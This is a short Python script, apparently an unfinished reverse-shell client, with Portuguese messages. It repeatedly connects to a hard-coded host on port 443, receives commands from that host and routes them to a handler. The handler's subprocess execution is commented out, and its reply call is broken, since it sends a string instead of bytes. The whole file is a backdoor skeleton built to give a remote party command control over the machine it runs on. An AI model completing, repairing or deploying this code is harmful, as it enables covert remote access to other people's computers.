import socket
import time
import subprocess
import threading

IP = '192.168.0.108'
PORT = 443

def connect(IP, PORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP, PORT))
        print('Conectado')
        return client
    except Exception as ERROR:
        print('ERROR: ', ERROR)
        

def listen(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == '/exit':
                return
            else:
                #threading.Thread(target=cmd, args=(client, data))
                cmd(client, data)

    except Exception as Error:
        print('ERRO: ', Error)
        client.close()

def cmd(client, data):
    try:
        #proc = subprocess.Popen(b"pwd", shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        #output = proc.stdout.read #+ proc.stderr.read
        client.send("Recebeu!!!")
    except Exception as Error:
        print('ERROR: ', Error)

if __name__ == '__main__':
    while True:
        client = connect(IP, PORT)
        if client:
            listen(client)
        else:
            print('Deu erro na conexão, tentando novamente...')
            time.sleep(3)
